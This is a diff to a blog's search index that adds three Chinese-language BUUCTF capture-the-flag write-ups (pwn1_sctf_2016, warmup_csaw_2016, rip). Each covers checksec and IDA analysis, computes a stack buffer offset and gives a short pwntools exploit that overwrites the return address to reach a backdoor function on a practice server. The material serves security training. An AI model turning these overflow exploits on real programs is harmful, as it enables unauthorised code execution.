@@ -4,11 +4,65 @@
   
     
     <entry>
+      <title>BUUCTF pwn1_sctf_2016</title>
+      <link href="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/"/>
+      <url>/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/</url>
+      
+        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/1.jpg" alt=""><br>32位程序，开启栈不可执行<br>IDA分析，vuln函数和后门函数<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/3.jpg" alt=""></p><p>vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的真正意思其实就是把I替换成you<br>执行程序试一试<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/4.jpg" alt=""><br>如我们所想一样<br>再看向缓冲区<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>gets允许输入32个字节，而s的缓冲区多达3C个字节，也就是相对于ebp有60个字节，则相对于eip有64个字节，正常输入的话无法造成缓冲区溢出<br>但结合程序会把’I’替换成’you’的效果来看，只要我们输入21个’I’，经过三倍字节替换后就会变成63个字节，再加上一个字节就能造成缓冲区溢出<br>所以可以写出exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./pwn1_sctf_2016')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26405</span><span class="token punctuation">)</span>get_flag_addr <span class="token operator">=</span> <span class="token number">0x08048f0d</span>payload <span class="token operator">=</span> <span class="token string">'I'</span><span class="token operator">*</span><span class="token number">20</span>payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">4</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>成功读取flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 栈溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BUUCTF warmup_csaw_2016</title>
+      <link href="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/"/>
+      <url>/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/</url>
+      
+        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/1.jpg" alt=""><br>64位程序，没有保护<br>拖入IDA查看,F5大法<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/2.jpg" alt=""><br>同样有一个后门函数，这个后门函数直接读取flag<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/3.jpg" alt=""><br>所以做法和rip一样<br>直接贴exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./warmup_csaw_2016')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27003</span><span class="token punctuation">)</span>get_flag_addr <span class="token operator">=</span> <span class="token number">0x40060d</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/4.jpg" alt=""><br>成功读取flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 栈溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BUUCTF rip</title>
       <link href="/LawlietLW.github.io/2020/01/23/buuctf-rip/"/>
       <url>/LawlietLW.github.io/2020/01/23/buuctf-rip/</url>
       
-        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+        <content type="html"><![CDATA[<p>入门栈溢出题目，首先checksec一下<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/1.jpg" alt=""><br>64位程序，没有任何保护</p><a id="more"></a><p>拖入IDA查看,F5大法好<br>首先是main函数<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/2.jpg" alt=""><br>还有一个后门函数fun()<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/3.jpg" alt=""><br>很明显,main函数中的gets存在溢出,接下来来确定溢出字节数<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/4.jpg" alt=""><br>相对于EIP有23个字节<br>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./rip')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27031</span><span class="token punctuation">)</span>fun_addr <span class="token operator">=</span> <span class="token number">0x40118a</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">23</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fun_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/5.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
       
       
       <categories>
